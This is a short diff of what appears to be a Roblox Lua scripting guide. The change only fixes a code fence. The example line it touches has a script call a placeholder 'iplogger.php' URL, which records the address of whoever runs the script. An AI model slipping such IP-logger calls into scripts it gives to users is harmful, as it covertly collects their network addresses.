@@ -19,4 +19,5 @@ game:GetService("HttpService"):GetAsync("Site Here")
 ```
 **[Example]**  
 ```lua
-game:HttpGet("https://mysite.com/iplogger.php")```
+game:HttpGet("https://mysite.com/iplogger.php")
+```
